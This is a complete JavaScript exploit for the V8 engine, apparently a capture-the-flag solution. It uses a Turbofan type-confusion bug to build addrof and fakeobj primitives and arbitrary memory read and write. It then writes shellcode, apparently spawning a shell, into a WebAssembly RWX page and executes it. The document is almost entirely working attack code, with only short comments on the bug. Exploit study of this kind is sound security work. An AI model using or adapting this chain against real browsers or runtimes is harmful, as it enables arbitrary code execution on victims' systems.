/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function read_at(a, b)
{
	for(var i = 0; i<10; i++)
		var j = i + 10;
	return a[b];
}

function write_at(a, b, c)
{
	for(var i = 0; i<10; i++)
		var j = i + 10;
	a[b] = c;
}


function optimize()
{
	a = [1.1, 1.2]
	b = [1.1, 1.2]
	for(var i = 0; i<1000000; i++)
	{
		read_at(a, 0);
		write_at(b, 0, 1.3);
	}
}

var obj_arr_map;
var double_arr_map;

function addrof(in_obj)
{
	obj = {"M":0x4d};
	obj_arr = [in_obj, in_obj];

	obj_arr[0] = in_obj;
	write_at(obj_arr, 1, itof(double_arr_map));
	let addr = obj_arr[0];
	//write_at(obj_arr, 1, itof(obj_arr_map));
	obj_arr = [obj, obj];
	return ftoi(addr);
}

function fakeobj(addr)
{
	console.log("The address to fake is " + addr.toString(16));
	obj = {"M":0x4d};
	obj_arr = [obj, obj];
	write_at(obj_arr, 0, itof(addr));

	fake = obj_arr[0];
	obj_arr = [obj, obj];
	return fake;
}

function main()
{
	// Trigger the bug.
	// The bug is that code to deoptimize is patched on turbofan
	// Turbofan will not notice a type change, we will make it
	// think it will only access objects as 64-bits double.
	optimize();

	obj = {"a":1};
	obj_arr = [obj, obj];
	obj_arr_map = ftoi(read_at(obj_arr, 1));
	double_arr_map = obj_arr_map - 0x50n;

	function arb_read(addr)
	{
		console.log("addr is " + addr.toString(16));
		var rw_arr = [itof(double_arr_map), 1.2, 1.3, 1.4];
		var fake = fakeobj(addrof(rw_arr) - 0x20n);
		rw_arr[1] = itof(0x800000000n + BigInt(addr) - 0x8n);
		return ftoi(fake[0]);
	}

	function arb_write(where, what)
	{
		var rw_arr = [itof(double_arr_map), 1.2, 1.3, 1.4];
		var fake = fakeobj(BigInt(addrof(rw_arr)) - 0x20n);
		rw_arr[1] = itof(0x800000000n + BigInt(where) - 0x8n);
		fake[0] = itof(what);
	}

	function copy_shellcode(addr, shellcode)
	{
		buf = new ArrayBuffer(0x100);
		dataview = new DataView(buf);
		backing_store_addr = addrof(buf) + 0x14n;
		console.log("backing store at " + backing_store_addr.toString(16));
		arb_write(backing_store_addr, addr);
		for(var i = 0; i<shellcode.length; i++)
		{
			dataview.setUint32(4*i, shellcode[i], true);
		}
	}

	var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	var wasm_mod = new WebAssembly.Module(wasm_code);
	var wasm_instance = new WebAssembly.Instance(wasm_mod);
	var f = wasm_instance.exports.main;
		
	wasm_instance_addr = addrof(wasm_instance);
	console.log("wasm instance addr " + wasm_instance_addr.toString(16));
	rwx = arb_read(wasm_instance_addr + 0x68n);
	console.log("rwx region at " + rwx.toString(16));
	
	shellcode = [3091753066, 1852400175, 1932472111, 3884533840, 23687784, 607420673, 16843009, 1784084017, 21519880, 2303219430, 1792160230, 84891707];
	copy_shellcode(rwx, shellcode);
	f();

}

main();
